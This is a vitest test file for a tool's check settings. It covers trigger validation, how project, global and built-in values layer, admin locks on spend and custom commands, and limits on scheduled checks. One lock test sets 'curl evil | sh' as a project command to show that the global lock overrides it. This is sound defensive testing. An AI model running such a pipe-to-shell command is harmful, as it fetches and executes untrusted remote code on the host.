import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { nextSlots, parseCron } from "../../src/control/checks/cron.js";
import { checksRead, effectiveChecks } from "../../src/control/checks/settings.js";
import { readUsageCalendar } from "../../src/control/usageCalendar.js";
import type { ChecksLayer, GlobalChecksLayer } from "../../src/control/checks/settingsSchema.js";
import { BUILTIN_TRIGGERS, validateTrigger, type Trigger } from "../../src/control/checks/trigger.js";
import { ControlError } from "../../src/control/errors.js";
import { orchestrationRevision, readOrchestrationSettings, writeOrchestrationSettings } from "../../src/control/orchestration.js";
import { applySetCheckLocks, applySetCheckSettings, applySetScheduledCheck } from "../../src/control/checks/commands.js";
import { openControlStore, type ControlStore } from "../../src/control/store.js";
import { readRepositorySettingsBody, writeRepositorySettingsBody } from "../../src/control/workspaceSettings.js";

/**
 * Checks spec 2026-10-22 §2.2: a trigger written into settings is validated by code on write. The bounds keep a person's
 * edit from building a trigger that fires on every pump tick (a paid review each time) or that nobody can read.
 */
const code = (fn: () => unknown): string | null => {
  try { fn(); return null; } catch (error) { return error instanceof ControlError ? error.code : `not-a-control-error:${String(error)}`; }
};
const clause = { any: [{ kind: "queue-idle" }] };

describe("trigger validation", () => {
  it("accepts the bounds' edges", () => {
    expect(code(() => validateTrigger({ all: [clause, clause, clause, clause] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: Array.from({ length: 6 }, () => ({ kind: "queue-idle" })) }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "landed-groups", min: 1 }, { kind: "landed-groups", min: 50 }] }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "since-last", ms: 600_000 }] }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "schedule", cron: "5 * * * *" }] }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "overlapping-files", minGroups: 2 }, { kind: "conflict-reconciled" }] }] }))).toBeNull();
  });

  it.each([
    ["no clause", { all: [] }],
    ["5 clauses", { all: [clause, clause, clause, clause, clause] }],
    ["an empty clause", { all: [{ any: [] }] }],
    ["7 conditions", { all: [{ any: Array.from({ length: 7 }, () => ({ kind: "queue-idle" })) }] }],
    ["landed-groups min 51", { all: [{ any: [{ kind: "landed-groups", min: 51 }] }] }],
    ["landed-groups min 0", { all: [{ any: [{ kind: "landed-groups", min: 0 }] }] }],
    ["since-last under 10 minutes", { all: [{ any: [{ kind: "since-last", ms: 599_999 }] }] }],
    ["overlapping-files minGroups 1", { all: [{ any: [{ kind: "overlapping-files", minGroups: 1 }] }] }],
    ["an unknown condition kind", { all: [{ any: [{ kind: "always" }] }] }],
    ["an unknown field on a condition", { all: [{ any: [{ kind: "queue-idle", extra: 1 }] }] }],
    ["an unknown field on the trigger", { all: [clause], any: [] }],
    ["an unparsable cron", { all: [{ any: [{ kind: "schedule", cron: "every monday" }] }] }],
  ])("refuses %s as control-argument-invalid", (_name, trigger) => {
    expect(code(() => validateTrigger(trigger))).toBe("control-argument-invalid");
  });

  it("refuses a schedule firing more often than hourly as check-schedule-too-frequent", () => {
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "schedule", cron: "* * * * *" }] }] }))).toBe("check-schedule-too-frequent");
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "queue-idle" }] }, { any: [{ kind: "schedule", cron: "0,30 9 * * *" }] }] }))).toBe("check-schedule-too-frequent");
  });
});

/**
 * Checks spec 2026-10-22 §4.1–§4.3, criterion 5: the effective value of every check setting is project > global >
 * built-in, field by field, and every read names where its value came from. A lock set globally lets a project only
 * tighten the security-class fields (the custom command runs outside the sandbox; the budget is spend): a looser
 * project value written before the lock is ignored while the lock stands and applies again after unlock.
 */
describe("effective check settings", () => {
  const withStore = async (fn: (store: ControlStore) => void | Promise<void>) => {
    const root = await mkdtemp(join(tmpdir(), "chk-eff-"));
    const store = await openControlStore({ stateDir: join(root, "s") });
    try { await fn(store); } finally { store.close(); await rm(root, { recursive: true, force: true }); }
  };
  const setGlobal = (store: ControlStore, checks: GlobalChecksLayer) => store.transaction(() => writeOrchestrationSettings(store, { maxRunningGroups: 3, checks }, orchestrationRevision(store) + 1));
  const setProject = (store: ControlStore, checks: ChecksLayer) => store.transaction(() => writeRepositorySettingsBody(store, "repo", { workspaceMode: "worktree", revision: 1, checks }));
  const B = (value: unknown) => ({ value, source: "builtin", lockedBy: null });
  const G = (value: unknown, lockedBy: "global" | null = null) => ({ value, source: "global", lockedBy });
  const P = (value: unknown, lockedBy: "global" | null = null) => ({ value, source: "project", lockedBy });

  it("with nothing set, every field is the built-in value (spec §3, §4.1)", () => withStore((store) => {
    expect(effectiveChecks(store, "repo")).toEqual({
      kinds: {
        "integration-check": { enabled: B(false), trigger: B(BUILTIN_TRIGGERS["integration-check"]), command: B(null) },
        "model-review": { enabled: B(true), trigger: B(BUILTIN_TRIGGERS["model-review"]), budgetTokens: B(1_000_000), maxGroupsPerReview: B(12) },
      },
      scheduled: [], locks: [],
    });
  }));

  it("takes each field from the nearest layer that sets it: project > global > built-in", () => withStore((store) => {
    setGlobal(store, { integrationCheck: { enabled: true, command: "npm test" }, modelReview: { budgetTokens: 500_000, enabled: false } });
    setProject(store, { integrationCheck: { enabled: false }, modelReview: { maxGroupsPerReview: 4, enabled: true } });
    const e = effectiveChecks(store, "repo");
    expect(e.kinds["integration-check"]).toEqual({ enabled: P(false), trigger: B(BUILTIN_TRIGGERS["integration-check"]), command: G("npm test") });
    expect(e.kinds["model-review"]).toEqual({ enabled: P(true), trigger: B(BUILTIN_TRIGGERS["model-review"]), budgetTokens: G(500_000), maxGroupsPerReview: P(4) });
    // The global read sees no project layer.
    const g = effectiveChecks(store, null);
    expect(g.kinds["integration-check"].enabled).toEqual(G(true));
    expect(g.kinds["model-review"].maxGroupsPerReview).toEqual(B(12));
  }));

  it("replaces a whole trigger, never merges it clause by clause", () => withStore((store) => {
    const global: Trigger = { all: [{ any: [{ kind: "landed-groups", min: 4 }] }, { any: [{ kind: "queue-idle" }] }] };
    const project: Trigger = { all: [{ any: [{ kind: "conflict-reconciled" }] }] };
    setGlobal(store, { modelReview: { trigger: global } });
    setProject(store, { modelReview: { trigger: project } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].trigger).toEqual(P(project));
    expect(effectiveChecks(store, null).kinds["model-review"].trigger).toEqual(G(global));
  }));

  it("ignores a looser project budget under a lock, honours a tighter one, and applies the looser one again after unlock", () => withStore((store) => {
    setProject(store, { modelReview: { budgetTokens: 800_000 } });
    setGlobal(store, { modelReview: { budgetTokens: 500_000 }, locks: ["modelReview.budgetTokens"] });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(G(500_000, "global"));
    expect(effectiveChecks(store, "repo").locks).toEqual(["modelReview.budgetTokens"]);
    setProject(store, { modelReview: { budgetTokens: 300_000 } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(300_000, "global"));
    setProject(store, { modelReview: { budgetTokens: 800_000 } });
    setGlobal(store, { modelReview: { budgetTokens: 500_000 } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(800_000));
    // Locked with no global value: the built-in value is the bound.
    setGlobal(store, { locks: ["modelReview.budgetTokens"] });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(800_000, "global"));
    setProject(store, { modelReview: { budgetTokens: 2_000_000 } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual({ ...B(1_000_000), lockedBy: "global" });
  }));

  it("under a command lock, a different project command is ignored; none (null) or the same one applies", () => withStore((store) => {
    setGlobal(store, { integrationCheck: { command: "npm test" }, locks: ["integrationCheck.command"] });
    setProject(store, { integrationCheck: { command: "curl evil | sh" } });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(G("npm test", "global"));
    setProject(store, { integrationCheck: { command: null } });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(P(null, "global"));
    setProject(store, { integrationCheck: { command: "npm test" } });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(P("npm test", "global"));
    // The lock binds only its own field.
    setProject(store, { integrationCheck: { command: "make check" }, modelReview: { budgetTokens: 2_000_000 } });
    setGlobal(store, { integrationCheck: { command: "npm test" }, locks: ["modelReview.budgetTokens"] });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(P("make check"));
  }));

  it("lists scheduled checks: a project entry with a global id overrides it, others keep their own scope", () => withStore((store) => {
    const weekly = { id: "weekly", kind: "model-review", cron: "0 9 * * 1", enabled: true, params: {} } as const;
    const nightly = { id: "nightly", kind: "integration-check", cron: "0 2 * * *", enabled: true, params: {} } as const;
    const monthly = { id: "monthly", kind: "model-review", cron: "0 9 1 * *", enabled: true, params: {} } as const;
    setGlobal(store, { scheduled: [weekly, monthly] });
    setProject(store, { scheduled: [{ ...weekly, enabled: false }, nightly] });
    expect(effectiveChecks(store, "repo").scheduled).toEqual([
      { ...P({ ...weekly, enabled: false }), scope: "global" },
      { ...G(monthly), scope: "global" },
      { ...P(nightly), scope: "project" },
    ]);
    expect(effectiveChecks(store, null).scheduled).toEqual([{ ...G(weekly), scope: "global" }, { ...G(monthly), scope: "global" }]);
  }));
});

/**
 * Checks spec 2026-10-22 §2.4, §4.1, §4.2 (plan Task 4): the person's setting writes. A lock exists so a project cannot
 * raise the spend or name a command Orca runs outside the sandbox past what the admin set globally; the limit of 8
 * scheduled checks per layer keeps unattended spend bounded; a schedule read in a zone the host cannot read must be
 * refused by name at write time, not crash the pump later.
 */
describe("check setting writes", () => {
  const withStore = async (fn: (store: ControlStore) => void | Promise<void>) => {
    const root = await mkdtemp(join(tmpdir(), "chk-write-"));
    const store = await openControlStore({ stateDir: join(root, "s") });
    try { await fn(store); } finally { store.close(); await rm(root, { recursive: true, force: true }); }
  };
  const deps = (store: ControlStore) => ({ store, knownRepository: (repoId: string) => repoId === "repo" });
  let n = 0;
  const REPO = { kind: "repository", repoId: "repo" } as const, GLOBAL = { kind: "orchestration" } as const;
  const raw = (store: ControlStore, verb: string, target: typeof REPO | typeof GLOBAL | { kind: "repository"; repoId: string }, payload: unknown) => ({
    schema: "orca-raw-command-v1", commandId: `cmd-${++n}`, actorId: "owner", verb, target, payload,
    expectedRevision: target.kind === "orchestration" ? orchestrationRevision(store) : readRepositorySettingsBody(store, target.repoId)?.revision ?? 0,
  }) as never;
  const codeOf = (body: unknown): string => ((body as { error?: { code: string; message: string } }).error?.code ?? "accepted");
  const messageOf = (body: unknown): string => ((body as { error?: { message: string } }).error?.message ?? "");
  const settings = (store: ControlStore, target: typeof REPO | typeof GLOBAL, payload: unknown) => applySetCheckSettings(deps(store), raw(store, "set-check-settings", target, payload));
  const schedule = (store: ControlStore, target: typeof REPO | typeof GLOBAL, payload: unknown) => applySetScheduledCheck(deps(store), raw(store, "set-scheduled-check", target, payload));
  const locks = (store: ControlStore, target: typeof REPO | typeof GLOBAL, value: string[]) => applySetCheckLocks(deps(store), raw(store, "set-check-locks", target, { locks: value }));

  it("writes and clears one kind's fields in the project layer under its revision; an unchanged write is a no-op", () => withStore((store) => {
    const trigger = { all: [{ any: [{ kind: "queue-idle" }] }] };
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: { enabled: false, trigger, maxGroupsPerReview: 4 }, clear: [] }))).toBe("accepted");
    expect(readRepositorySettingsBody(store, "repo")).toMatchObject({ revision: 1, checks: { modelReview: { enabled: false, trigger, maxGroupsPerReview: 4 } } });
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: {}, clear: ["trigger", "enabled"] }))).toBe("accepted");
    expect(readRepositorySettingsBody(store, "repo")).toMatchObject({ revision: 2, checks: { modelReview: { maxGroupsPerReview: 4 } } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].trigger.source).toBe("builtin");
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: { maxGroupsPerReview: 4 }, clear: [] }))).toBe("no-op-command");
    // The global layer moves the @orchestration revision and keeps the cap.
    expect(codeOf(settings(store, GLOBAL, { kind: "integration-check", set: { enabled: true, command: "npm test" }, clear: [] }))).toBe("accepted");
    expect(readOrchestrationSettings(store)).toEqual({ maxRunningGroups: 3, checks: { integrationCheck: { enabled: true, command: "npm test" } } });
    expect(orchestrationRevision(store)).toBe(1);
  }));

  it("validates a written trigger on write (bounds, too-frequent schedule)", () => withStore((store) => {
    // A bound the payload schema carries is refused before the ledger (the route answers control-non-json-payload).
    expect(() => settings(store, REPO, { kind: "model-review", set: { trigger: { all: [{ any: [{ kind: "since-last", ms: 1 }] }] } }, clear: [] })).toThrow(/greater than or equal to 600000/);
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: { trigger: { all: [{ any: [{ kind: "schedule", cron: "*/5 * * * *" }] }] } }, clear: [] }))).toBe("check-schedule-too-frequent");
  }));

  it("under a budget lock refuses a higher project budget naming the lock, and accepts a lower one", () => withStore((store) => {
    expect(codeOf(settings(store, GLOBAL, { kind: "model-review", set: { budgetTokens: 400_000 }, clear: [] }))).toBe("accepted");
    expect(codeOf(locks(store, GLOBAL, ["modelReview.budgetTokens"]))).toBe("accepted");
    const higher = settings(store, REPO, { kind: "model-review", set: { budgetTokens: 400_001 }, clear: [] });
    expect([codeOf(higher), messageOf(higher)]).toEqual(["check-setting-locked", "check-setting-locked:modelReview.budgetTokens"]);
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: { budgetTokens: 400_000 }, clear: [] }))).toBe("accepted");
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: { budgetTokens: 10 }, clear: [] }))).toBe("accepted");
    // The global layer itself is not bound by its own lock.
    expect(codeOf(settings(store, GLOBAL, { kind: "model-review", set: { budgetTokens: 2_000_000 }, clear: [] }))).toBe("accepted");
  }));

  it("under a command lock refuses a different project command, accepts the global one and null", () => withStore((store) => {
    expect(codeOf(settings(store, GLOBAL, { kind: "integration-check", set: { command: "npm test" }, clear: [] }))).toBe("accepted");
    expect(codeOf(locks(store, GLOBAL, ["integrationCheck.command"]))).toBe("accepted");
    const other = settings(store, REPO, { kind: "integration-check", set: { command: "rm -rf build && make" }, clear: [] });
    expect([codeOf(other), messageOf(other)]).toEqual(["check-setting-locked", "check-setting-locked:integrationCheck.command"]);
    expect(codeOf(settings(store, REPO, { kind: "integration-check", set: { command: "npm test" }, clear: [] }))).toBe("accepted");
    expect(codeOf(settings(store, REPO, { kind: "integration-check", set: { command: null }, clear: [] }))).toBe("accepted");
    // Without the lock the same command is a person's choice again.
    expect(codeOf(locks(store, GLOBAL, []))).toBe("accepted");
    expect(codeOf(settings(store, REPO, { kind: "integration-check", set: { command: "rm -rf build && make" }, clear: [] }))).toBe("accepted");
  }));

  it("refuses set-check-locks on a repository target, and an unknown repository", () => withStore((store) => {
    expect(codeOf(locks(store, REPO, ["modelReview.budgetTokens"]))).toBe("control-target-not-allowed");
    expect(readOrchestrationSettings(store).checks).toBeUndefined();
    expect(codeOf(applySetCheckSettings(deps(store), raw(store, "set-check-settings", { kind: "repository", repoId: "elsewhere" }, { kind: "model-review", set: { enabled: false }, clear: [] })))).toBe("control-target-not-allowed");
  }));

  it("refuses a 9th scheduled check per layer (project and global separately); replacing or removing one is not a 9th", () => withStore((store) => {
    for (const target of [REPO, GLOBAL]) {
      for (let i = 1; i <= 8; i += 1) expect(codeOf(schedule(store, target, { id: `s${i}`, kind: "model-review", cron: `${i} 9 * * 1`, enabled: true }))).toBe("accepted");
      expect(codeOf(schedule(store, target, { id: "s9", kind: "model-review", cron: "9 9 * * 1", enabled: true }))).toBe("check-schedule-limit");
      expect(codeOf(schedule(store, target, { id: "s8", kind: "integration-check", cron: "0 3 * * *", enabled: false }))).toBe("accepted");
      expect(codeOf(schedule(store, target, { id: "s1", remove: true }))).toBe("accepted");
      expect(codeOf(schedule(store, target, { id: "s1", remove: true }))).toBe("no-op-command");
      expect(codeOf(schedule(store, target, { id: "s9", kind: "model-review", cron: "9 9 * * 1", enabled: true }))).toBe("accepted");
    }
    expect(readRepositorySettingsBody(store, "repo")?.checks?.scheduled?.map((s) => s.id)).toEqual(["s2", "s3", "s4", "s5", "s6", "s7", "s8", "s9"]);
    expect(readOrchestrationSettings(store).checks?.scheduled?.find((s) => s.id === "s8")).toEqual({ id: "s8", kind: "integration-check", cron: "0 3 * * *", enabled: false, params: {} });
  }));

  it("refuses a schedule more often than hourly, and one whose time zone the host cannot read, by name", () => withStore((store) => {
    expect(codeOf(schedule(store, REPO, { id: "fast", kind: "model-review", cron: "0,30 * * * *", enabled: true }))).toBe("check-schedule-too-frequent");
    store.db.prepare("INSERT INTO usage_calendar(singleton,time_zone,week_start) VALUES (1,'Mars/Olympus',1)").run();
    const bad = schedule(store, REPO, { id: "weekly", kind: "model-review", cron: "0 9 * * 1", enabled: true });
    expect([codeOf(bad), messageOf(bad)]).toEqual(["check-time-zone-invalid", "check-time-zone-invalid:Mars/Olympus"]);
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: { trigger: { all: [{ any: [{ kind: "schedule", cron: "0 9 * * 1" }] }] } }, clear: [] }))).toBe("check-time-zone-invalid");
    expect(readRepositorySettingsBody(store, "repo")).toBeNull();
  }));

  // Spec §4.3, §7 (Task 10): the Web saves a layer under the revision it read, so the read names the revision a write to
  // that layer is checked against -- the project's own for a project read (a run-now or resume is checked against it
  // too), `@orchestration`'s for the global read -- and each enabled scheduled check's next slots, computed by the
  // server's own cron (the Web keeps no copy of it).
  it("the read names its layer's revision and each enabled scheduled check's next three slots", () => withStore((store) => {
    expect([checksRead(store, "repo").revision, checksRead(store, null).revision]).toEqual([0, 0]);
    expect(codeOf(settings(store, REPO, { kind: "model-review", set: { enabled: false }, clear: [] }))).toBe("accepted");
    expect(codeOf(settings(store, GLOBAL, { kind: "model-review", set: { maxGroupsPerReview: 5 }, clear: [] }))).toBe("accepted");
    expect(codeOf(settings(store, GLOBAL, { kind: "model-review", set: { maxGroupsPerReview: 6 }, clear: [] }))).toBe("accepted");
    // mutation: the project read names the @orchestration revision -> 2, red
    expect(checksRead(store, "repo").revision).toBe(1);
    expect(checksRead(store, null).revision).toBe(2);

    expect(codeOf(schedule(store, GLOBAL, { id: "weekly", kind: "model-review", cron: "0 9 * * 1", enabled: true }))).toBe("accepted");
    expect(codeOf(schedule(store, GLOBAL, { id: "off", kind: "integration-check", cron: "0 3 * * *", enabled: false }))).toBe("accepted");
    const now = Date.UTC(2026, 9, 22, 12, 0, 0); // a Thursday
    const read = checksRead(store, "repo", now);
    expect(read.nextSlots.weekly).toEqual(nextSlots(parseCron("0 9 * * 1"), readUsageCalendar(store).timeZone, now, 3));
    expect(read.nextSlots.weekly).toHaveLength(3);
    // mutation: compute slots for a disabled one too -> three slots, red
    expect(read.nextSlots.off).toEqual([]);
    // A time zone the host cannot read leaves the preview empty; the read itself still answers.
    store.db.prepare("INSERT INTO usage_calendar(singleton,time_zone,week_start) VALUES (1,'Mars/Olympus',1)").run();
    expect(checksRead(store, "repo", now).nextSlots.weekly).toEqual([]);
  }));
});
